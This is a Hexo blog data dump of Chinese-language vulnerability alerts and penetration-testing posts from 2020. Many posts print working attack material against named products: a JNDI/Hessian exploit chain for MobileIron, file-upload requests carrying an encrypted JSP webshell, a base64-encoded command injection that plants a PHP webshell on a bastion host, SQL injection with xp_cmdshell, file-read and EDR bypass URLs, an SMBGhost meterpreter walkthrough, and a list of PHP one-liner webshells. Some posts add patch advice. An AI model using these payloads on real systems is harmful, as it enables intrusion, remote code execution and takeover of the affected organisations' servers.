{"meta":{"title":"YGnight's blog","subtitle":"","description":"","author":"YGnight","url":"https://yejinpoxiao.xyz","root":"/"},"pages":[{"title":"文章分类","date":"2019-12-12T09:24:10.553Z","updated":"2019-12-12T09:24:10.553Z","comments":true,"path":"categories/index.html","permalink":"https://yejinpoxiao.xyz/categories/index.html","excerpt":"","text":""},{"title":"资料信息","date":"2019-12-12T08:50:07.000Z","updated":"2020-05-28T03:37:02.444Z","comments":true,"path":"about/index.html","permalink":"https://yejinpoxiao.xyz/about/index.html","excerpt":"","text":"YGnight 原夜尽破晓团队队长"},{"title":"archives","date":"2019-12-12T08:50:14.000Z","updated":"2019-12-12T08:50:14.037Z","comments":true,"path":"archives/index.html","permalink":"https://yejinpoxiao.xyz/archives/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-12-12T08:50:35.000Z","updated":"2019-12-12T09:23:45.384Z","comments":true,"path":"tags/index.html","permalink":"https://yejinpoxiao.xyz/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"MobileIronMDM 未授权RCE","slug":"MobileIronMDM 未授权RCE","date":"2020-09-15T15:11:57.149Z","updated":"2020-09-15T15:27:46.299Z","comments":true,"path":"2020/09/15/MobileIronMDM 未授权RCE/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/15/MobileIronMDM%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE/","excerpt":"","text":"exp123java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 0.0.0.0 -C \"&lt;Command&gt;\"java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian SpringAbstractBeanFactoryPointcutAdvisor rmi://&lt;server-ip&gt;:1099/&lt;codebase&gt; &gt; exppython hessian.py -p exp -u 'https://mobileiron-mdm-instance/mifs/.;/services/LogService'","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"2020HW第三弹","slug":"2020HW第三弹","date":"2020-09-13T15:45:00.473Z","updated":"2020-09-13T15:54:44.383Z","comments":true,"path":"2020/09/13/2020HW第三弹/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/13/2020HW%E7%AC%AC%E4%B8%89%E5%BC%B9/","excerpt":"","text":"联软科技产品存在任意文件上传和命令执行漏洞：漏洞详情：任意文件上传漏洞，存在于用户自检报告上传时，后台使用黑名单机制对上传的文件进行过滤和限制，由于当前黑名单机制存在缺陷，文件过滤机制可以被绕过，导致存在文件上传漏洞；利用该漏洞可以获取webshell权限。（猜测利用黑名单的其他后缀名绕过） 命令执行漏洞，存在于后台资源读取过程中，对于自动提交的用户可控参数没有进行安全检查，可以通过构造特殊参数的数据包，后台在执行过程中直接执行了提交数据包中的命令参数，导致命令执行漏洞；该漏洞能够以当前运行的中间件用户权限执行系统命令，根据中间件用户权限不同，可以进行添加系统账户，使用反弹shell等操作。 poc1234567891011121314POST /uai/download/uploadfileToPath.htm HTTP/1.1HOST: xxxxx-----------------------------570xxxxxxxxx6025274xxxxxxxx1Content-Disposition: form-data; name=\"input_localfile\"; filename=\"xxx.jsp\"Content-Type: image/png&lt;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(\"POST\"))&#123;String k=\"xxxxxxxxxxxxxxxx\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt; -----------------------------570xxxxxxxxx6025274xxxxxxxx1Content-Disposition: form-data; name=\"uploadpath\" ../webapps/notifymsg/devreport/-----------------------------570xxxxxxxxx6025274xxxxxxxx1-- 转载自：大老李 F11Team","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"告警信息","slug":"告警信息","permalink":"https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"}]},{"title":"2020HW第二弹","slug":"2020HW第二弹","date":"2020-09-12T17:35:26.051Z","updated":"2020-09-12T18:06:38.972Z","comments":true,"path":"2020/09/13/2020HW第二弹/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/13/2020HW%E7%AC%AC%E4%BA%8C%E5%BC%B9/","excerpt":"","text":"PAN-OS远程代码执行漏洞（CVE-2020-2040）漏洞概述PAN-OS是一个运行在Palo Alto Networks防火墙和企业VPN设备上的操作系统。近日PAN-OS被曝出存在远程代码执行漏洞。 该漏洞是PAN-OS上的一个缓冲区溢出漏洞，当启用了强制门户或配置了多重身份验证（MFA）时，未经身份验证的攻击者可通过向Captive Portal或Multi-Factor Authentication接口发送恶意请求进行利用，可能导致系统进程中断，并允许使用root特权在PAN-OS设备上执行任意代码。 修复建议目前官方已针对此漏洞发布了更新版本，请受影响的用户尽快升级至安全版本进行防护，官方更新指南： https://docs.paloaltonetworks.com/pan-os/10-0/pan-os-admin/software-and-content-updates/pan-os-software-updates.html 齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）漏洞利用无需登录 利用过程: 第一，http://10.20.10.11/listener/cluster_manage.php返回“OK”。 第二，执行以下链接即可getshell，执行成功后，生成PHP一句话马/var/www/shterm/resources/qrcode/lbj77.php密码10086。这里假设10.20.10.10为堡垒机的IP地址。 1https://10.20.10.10/ha_request.php?action=install&amp;ipaddr=10.20.10.11&amp;node_id=1$&#123;IFS&#125;|`echo$&#123;IFS&#125;\"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK\"|base64$&#123;IFS&#125;-d|bash`|$&#123;IFS&#125;|echo$&#123;IFS&#125; 修复建议 $node_id的看起来应该是一个整数，所以只需在ha_request.php文件开头，添加以下一行代码，对该变量进行过滤即可。 1 $node_id = @intval($req_node_id); 泛微云桥任意文件读取漏洞漏洞描述泛微云桥是一个为了满足用户提出的阿里钉钉与泛微OA集成需求,近日,泛微与阿里钉钉工程师多方联合,集合内部研发力量共同完成的“泛微云桥e-bridge平台”，近日泛微云桥被曝出存在任意文件读取漏洞。 影响版本： 该漏洞几乎影响2018-2019全版本。 漏洞利用1234GET /wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt HTTP/1.1User-Agent: curl/7.29.0Host: 127.0.0.1Accept: */* 将相应包中的id提交 1234GET /file/fileNoLogin/xxxxxxxxxx HTTP/1.1User-Agent: curl/7.29.0Host: 127.0.0.1Accept: */* 修复建议去官网更新最新版本。 网瑞达webVPN RCE漏洞漏洞描述WebVPN是提供基于web的内网应用访问控制，允许授权用户访问只对内网开放的web应用，实现类似VPN（虚拟专用网）的功能。近日网瑞达的webVPN被曝出存在RCE的漏洞。 修复建议去官网更新最新版本","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"告警信息","slug":"告警信息","permalink":"https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"}]},{"title":"phpstudy默认配置nginx存在解析漏洞","slug":"phpstudy默认配置nginx存在解析漏洞","date":"2020-09-11T11:16:54.440Z","updated":"2020-09-11T11:18:27.479Z","comments":true,"path":"2020/09/11/phpstudy默认配置nginx存在解析漏洞/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/11/phpstudy%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AEnginx%E5%AD%98%E5%9C%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"告警信息2020年09月03日，国内安全团队监测发现 phpstudy 发布了phpstudy 安全配置错误漏洞的风险通告，该漏洞等级为高危；phpStudy 默认配置存在 nginx 解析漏洞。 漏洞概述由于 cgi.fix_pathinfo=1 使用默认配置，效果为当前目录下文件不存在，则采用上层路径；由于info.jpg文件，而后缀是jpg，php配置文件php-fpm.conf 中的 security.limit_extensions 参数值决定了jpg是否可以解析成php，而由于windows版本中没有此文件所以默认都可以解析为php，再加上php.ini参数cgi.fix_pathinfo使用默认配置，导致Windows下 phpstudy存在nginx解析漏洞。 影响版本win：phpstudy : &lt;=8.1.0.7 漏洞复现启动phpstudy 放个图片码到web目录 蚂剑连接一句话木马成功。 修复更新到最新版","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"天融信TopApp-LB 负载均衡系统sql注入","slug":"天融信TopApp-LB 负载均衡系统sql注入","date":"2020-09-11T10:57:40.855Z","updated":"2020-09-11T11:28:37.247Z","comments":true,"path":"2020/09/11/天融信TopApp-LB 负载均衡系统sql注入/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/11/%E5%A4%A9%E8%9E%8D%E4%BF%A1TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"产品概述天融信负载均衡系统TopApp为用户提供高可靠的数据中心解决方案，包括单数据中心的链路负载均衡、服务器负载均衡解决方案，以及多数据中心的全局负载均衡解决方案。TopApp集成了压缩、缓存、SSL卸载等网络优化技术来加速业务系统交付的整个过程，提升业务系统处理效率；同时结合Web应用防火墙、DNS防火墙、DDOS攻击防护及漏洞扫描等技术手段形成全方位的网络安全防护，为用户业务系统的安全保驾护航。 POC123456789101112131415161718192021222324252627282930313233POST /acc/clsf/report/datasource.php HTTP/1.1Host:Connection: closeAccept: text/javascript, text/html, application/xml, text/xml, */*X-Prototype-Version: 1.6.0.3X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57Content-Type: application/x-www-form-urlencodedContent-Length: 201 t=l&amp;e=0&amp;s=t&amp;l=1&amp;vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&amp;gid=0&amp;lmt=10&amp;o=r_Speed&amp;asc=false&amp;p=8&amp;lipf=&amp;lipt=&amp;ripf=&amp;ript=&amp;dscp=&amp;proto=&amp;lpf=&amp;lpt=&amp;rpf=&amp;rpt=@ ......","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"用友GRP-u8 注入POC","slug":"用友GRP-u8 注入POC","date":"2020-09-11T10:52:55.742Z","updated":"2020-09-11T10:55:02.357Z","comments":true,"path":"2020/09/11/用友GRP-u8 注入POC/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/11/%E7%94%A8%E5%8F%8BGRP-u8%20%E6%B3%A8%E5%85%A5POC/","excerpt":"","text":"POC12345678910111213141516171819POST /Proxy HTTP/1.1Accept: Accept: */*Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)Host: hostContent-Length: 357Connection: Keep-AliveCache-Control: no-cache cVer=9.8.0&amp;dp=&lt;?xml version=\"1.0\" encoding=\"GB2312\"?&gt;&lt;R9PACKET version=\"1\"&gt;&lt;DATAFORMAT&gt;XML&lt;/DATAFORMAT&gt;&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;/NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;/NAME&gt;&lt;DATA format=\"text\"&gt;DataSetProviderData&lt;/DATA&gt;&lt;/PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;/NAME&gt;&lt;DATA format=\"text\"&gt;exec xp_cmdshell 'net user'&lt;/DATA&gt;&lt;/PARAM&gt;&lt;/PARAMS&gt;&lt;/R9FUNCTION&gt;&lt;/R9PACKET&gt;","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"绿盟UTS综合威胁探针管理员任意登录","slug":"绿盟UTS综合威胁探针管理员任意登录","date":"2020-09-11T10:29:40.876Z","updated":"2020-09-11T10:49:50.069Z","comments":true,"path":"2020/09/11/绿盟UTS综合威胁探针管理员任意登录/","link":"","permalink":"https://yejinpoxiao.xyz/2020/09/11/%E7%BB%BF%E7%9B%9FUTS%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88%E7%AE%A1%E7%90%86%E5%91%98%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/","excerpt":"","text":"产品概述绿盟全流量威胁分析解决方案针对原始流量进行采集和监控，对流量信息进行深度还原、存储、查询和分析，可以及时掌握重要信息系统相关网络安全威胁风险，及时检测漏洞、病毒木马、网络攻击情况，及时发现网络安全事件线索，及时通报预警重大网络安全威胁，调查、防范和打击网络攻击等恶意行为，保障重要信息系统的网络安全。 影响版本V2.0R00F02SP02及之前版本 利用 释放请求包，对响应包进行修改，将false更改为true 可以看到相应包回显了密码md5后的密文 将此md5替换登录的请求包，成功登录 修复http://update.nsfocus.com/update/listBsaUtsDetail/v/F02","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"宝塔数据库未授权访问漏洞","slug":"宝塔数据库未授权访问漏洞","date":"2020-08-23T14:59:51.686Z","updated":"2020-08-23T15:11:04.549Z","comments":true,"path":"2020/08/23/宝塔数据库未授权访问漏洞/","link":"","permalink":"https://yejinpoxiao.xyz/2020/08/23/%E5%AE%9D%E5%A1%94%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"产品概述宝塔面板是提升运维效率的服务器管理软件，支持一键LAMP/LNMP/集群/监控/网站/FTP/数据库/JAVA等100多项服务器管理功能。 影响版本Linux版本 7.4.2版本 Linux测试版本 7.5.14版本 Windows版 6.8版本 利用条件环境部署了phpmyadmin 漏洞利用payload ： http://ip:888/pma/ 修复升级宝塔面板至最新版本","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"告警信息","slug":"告警信息","permalink":"https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"}]},{"title":"深x服EDR终端检测平台存在任意用户登录漏洞","slug":"深x服EDR终端检测平台存在任意用户登录漏洞","date":"2020-08-20T01:58:52.867Z","updated":"2020-08-23T15:12:18.716Z","comments":true,"path":"2020/08/20/深x服EDR终端检测平台存在任意用户登录漏洞/","link":"","permalink":"https://yejinpoxiao.xyz/2020/08/20/%E6%B7%B1x%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"前言本次测试版本为3.2.15，网上已知最高可打3.2.19，其他版本自行测试。 注：禁止非授权入侵 漏洞利用payload: https://ip/ui/login.php?user=arbitrarily 示例 利用payload进行任意登录 整改建议及时进行更新，关注官网补丁信息。","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"通达OA任意文件删除实现getshell","slug":"通达OA任意文件删除实现getshell","date":"2020-08-19T14:46:18.739Z","updated":"2020-08-19T14:58:11.200Z","comments":true,"path":"2020/08/19/通达OA任意文件删除实现getshell/","link":"","permalink":"https://yejinpoxiao.xyz/2020/08/19/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E5%AE%9E%E7%8E%B0getshell/","excerpt":"","text":"产品概述​ 通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。 通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。 此外，通达OA通过融合不同的信息化资源，打通信息“孤岛”，精细化流程管理，改善管理模式，实现资源的优化配置和高效运转，全面提升企业竞争力。它是通达信科在二十余年从事管理软件研发和服务过程中集技术创新、项目实践、先进的管理思想和中肯的客户建议为一体的完美结晶。 漏洞复现本地搭建通达OA环境，本次试验使用版本为11.6（其余版本自行测试） 使用exp脚本进行getshell 1python3 tongdaOA_rce.py http://192.168.168.133:8080 成功上传一句话，连接webshell 注：此漏洞利用会导致删除inc文件夹下的auth.inc.php，从而导致系统无法正常使用，禁止进行未授权测试。","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"深x服EDR v3.2.21 (20200703)源码泄露","slug":"深x服EDR v3.2.21 (20200703)源码泄露","date":"2020-08-19T04:56:48.669Z","updated":"2020-08-23T15:11:58.049Z","comments":true,"path":"2020/08/19/深x服EDR v3.2.21 (20200703)源码泄露/","link":"","permalink":"https://yejinpoxiao.xyz/2020/08/19/%E6%B7%B1x%E6%9C%8DEDR%20v3.2.21%20(20200703)%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/","excerpt":"","text":"告警信息解决之前版本的远程任意代码注入漏洞，深x服EDR 更新到3.2.21 版本 更新文献：https://bbs.sangfor.com.cn/plugin.php?id=service:download&amp;action=view&amp;fid=100000022878128#/100000035115623/all/undefined 早期可能误传导致源码泄露（现阶段官网社区已经删除） 由于特殊时期，具体详情暂不描述 风险源码泄露能被恶意攻击者进行代码审计分析，从而挖掘出新的漏洞，达到入侵目的。 HW期间建议1.对EDR管理平台做acl策略，限制ip； 2.暂时下线","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"告警信息","slug":"告警信息","permalink":"https://yejinpoxiao.xyz/tags/%E5%91%8A%E8%AD%A6%E4%BF%A1%E6%81%AF/"}]},{"title":"深x服EDR终端检测平台RCE漏洞","slug":"深x服EDR终端检测平台RCE漏洞","date":"2020-08-17T15:02:48.856Z","updated":"2020-08-23T15:12:42.343Z","comments":true,"path":"2020/08/17/深x服EDR终端检测平台RCE漏洞/","link":"","permalink":"https://yejinpoxiao.xyz/2020/08/17/%E6%B7%B1x%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"产品概述深x服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀能力、更为持续的检测能力、更为快速的处置能力。在应对高级威胁的同时，通过云网端联动协同、威胁情报共享、多层级响应机制，帮助用户快速处置终端安全问题，构建轻量级、智能化、响应快的下一代终端安全系统。 漏洞复现1PAYLOAD：/tool/log/c.php?strip_slashes=system&amp;host=pwd 整改建议现阶段深x服终端检测响应平台EDR出现多处漏洞，官方暂未提供相关补丁更新，建议暂时下线此平台系统，等待后续更新修复漏洞后再上线。","categories":[{"name":"漏洞告警","slug":"漏洞告警","permalink":"https://yejinpoxiao.xyz/categories/%E6%BC%8F%E6%B4%9E%E5%91%8A%E8%AD%A6/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]},{"title":"cve-2020-0787-Windows提权","slug":"cve-2020-0787-Windows提权","date":"2020-06-22T03:14:28.288Z","updated":"2020-06-22T03:22:20.940Z","comments":true,"path":"2020/06/22/cve-2020-0787-Windows提权/","link":"","permalink":"https://yejinpoxiao.xyz/2020/06/22/cve-2020-0787-Windows%E6%8F%90%E6%9D%83/","excerpt":"","text":"摘要Windows Background Intelligent Transfer Service 权限提升漏洞 当Windows Background Intelligent Transfer Service (BITS)未能正确地处理符号链接时，存在权限提升漏洞。成功利用此漏洞的攻击者可以覆盖导致提升状态的目标文件。要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行巧尽心思构建的应用程序，利用此漏洞并控制受影响的系统。 影响范围Windows 10，Server 2016，Server 2019，Server version 1803，Server version 1903，Server version 1909，Windows 8.1，Server 2012，Server 2012 R2 利用","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"提权","slug":"提权","permalink":"https://yejinpoxiao.xyz/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"安装python-ldap模块过坑","slug":"安装python模块过坑","date":"2020-06-19T07:13:48.922Z","updated":"2020-06-19T07:32:21.282Z","comments":true,"path":"2020/06/19/安装python模块过坑/","link":"","permalink":"https://yejinpoxiao.xyz/2020/06/19/%E5%AE%89%E8%A3%85python%E6%A8%A1%E5%9D%97%E8%BF%87%E5%9D%91/","excerpt":"","text":"Linux安装python-ldap1sudo apt-get install libsasl2-dev python-dev libldap2-dev libssl-dev 1sudo pip3 install python-ldap Windows安装python-ldap安装 whl 包：https://www.lfd.uci.edu/~gohlke/pythonlibs/#python-ldap 下载相对应的whl包，再安装即可 1pip3 install pyldap-2.4.45-cp37-cp37m-win_amd64.whl","categories":[{"name":"遇坑笔记","slug":"遇坑笔记","permalink":"https://yejinpoxiao.xyz/categories/%E9%81%87%E5%9D%91%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://yejinpoxiao.xyz/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"永恒之黑(cve-2020-0796)配合msf获取shell","slug":"永恒之黑(cve-2020-0796)配合msf获取shell","date":"2020-06-04T07:05:29.171Z","updated":"2020-07-08T09:49:23.561Z","comments":true,"path":"2020/06/04/永恒之黑(cve-2020-0796)配合msf获取shell/","link":"","permalink":"https://yejinpoxiao.xyz/2020/06/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91(cve-2020-0796)%E9%85%8D%E5%90%88msf%E8%8E%B7%E5%8F%96shell/","excerpt":"","text":"前言 今天看到tools上的cve-2020-0796复现文章，就此自己搭建一下环境复现，做一下笔记 影响范围Windows 10 Version 1903， Windows Server Version 1903(Server Core installation)，Windows 10 Version 1909， 和Windows Server Version 1909(Server Core installation)受到这个漏洞的影响。不过值得注意的是，引入SMBv3的Windows 8和Windows Server 2012也有可能受到影响。 工具GitHub上Fork过来的 https://github.com/YGnight/SMBGhost_RCE_PoC kali集成 metasploit ：开源安全漏洞检测工具； msfvenom ：metasploit的标准payload生成器 实操使用msfvenom生成直连exploit 1msfvenom -p windows/x64/meterpreter/bind_tcp lport=1314 -f py -o cve-2020-0796.py 将生成的与脚本exploit.py里user_payload进行替换 使用python3运行exploit （版本不要过高，本地复现使用的python3.7.4） 1python3 exploit.py -ip 192.168.168.130 运行metasploit 12345use exploit/multi/handlerset payload /windows/x64/meterpreter/bind_tcpset lport 1314 指定目标机，run 123set rhost 192.168.168.130run 得到shell","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"提权","slug":"提权","permalink":"https://yejinpoxiao.xyz/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"pipePotato-新型通用提权","slug":"pipePotato-新型通用提权","date":"2020-05-08T02:35:08.963Z","updated":"2020-06-04T07:20:32.731Z","comments":true,"path":"2020/05/08/pipePotato-新型通用提权/","link":"","permalink":"https://yejinpoxiao.xyz/2020/05/08/pipePotato-%E6%96%B0%E5%9E%8B%E9%80%9A%E7%94%A8%E6%8F%90%E6%9D%83/","excerpt":"","text":"影响范围本地提权，对于任意windows Server 2012以上的windows server版本(win8以上的某些windows版本也行)，从Service用户提到System 用户，在 windows Server 2012， windows Server 2016， windows Server 2019 全补丁的情况都测试成功了。 工具GitHub上有源码，自行编译即可 具体操作cmd运行 whoami #查看权限 whoami /priv #查看是否具有SeImpersonatePrivilege权限 PrintSpoofer.exe -i -c &quot;whoami&quot; #查看权限是否提升为system","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"提权","slug":"提权","permalink":"https://yejinpoxiao.xyz/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"PHP代码执行函数","slug":"PHP代码执行函数","date":"2020-01-13T08:20:20.808Z","updated":"2020-01-17T09:40:21.612Z","comments":true,"path":"2020/01/13/PHP代码执行函数/","link":"","permalink":"https://yejinpoxiao.xyz/2020/01/13/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/","excerpt":"","text":"1、eval()函数#eval() 函数把字符串按照 PHP 代码来计算 #常见一句话： &lt;?php @eval($_POST[&apos;YGnight&apos;]);?&gt;2、assert()函数#与eval类似 #常见一句话 &lt;?php @assert($_POST[&apos;YGnight&apos;])?&gt;3、array_map()函数#array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。 #命令执行http://localhost/123.php?func=system cmd=whoami #菜刀连接http://localhost/123.php?func=assert 密码：cmd $func=$_GET[&apos;func&apos;]; $cmd=$_POST[&apos;cmd&apos;]; $array[0]=$cmd; $new_array=array_map($func,$array); echo $new_array;4、create_function()函数#创建匿名函数 #执行命令和上传文件参考eval函数(必须加分号)。 #菜刀连接密码：cmd $func =create_function(&apos;&apos;,$_POST[&apos;cmd&apos;]);$func();5、preg_replace()函数#preg_replace(&apos;正则规则&apos;,&apos;替换字符&apos;，&apos;目标字符&apos;) #执行命令和上传文件参考assert函数(不需要加分号)。 #将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。 preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;);6、call_user_func()函数#传入的参数作为assert函数的参数 #cmd=system(whoami) #菜刀连接密码：cmd call_user_func(&quot;assert&quot;,$_POST[&apos;cmd&apos;]);7、call_user_func_array()函数#将传入的参数作为数组的第一个值传递给assert函数 #cmd=system(whoami) #菜刀连接密码：cmd $cmd=$_POST[&apos;cmd&apos;]; $array[0]=$cmd; call_user_func_array(&quot;assert&quot;,$array);8、array_filter()函数#用回调函数过滤数组中的元素：array_filter(数组,函数) #命令执行func=system&amp;cmd=whoami #菜刀连接http://localhost/123.php?func=assert 密码cmd $cmd=$_POST[&apos;cmd&apos;]; $array1=array($cmd); $func =$_GET[&apos;func&apos;]; array_filter($array1,$func);9、uasort()函数#php环境&gt;=&lt;5.6才能用 #uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。 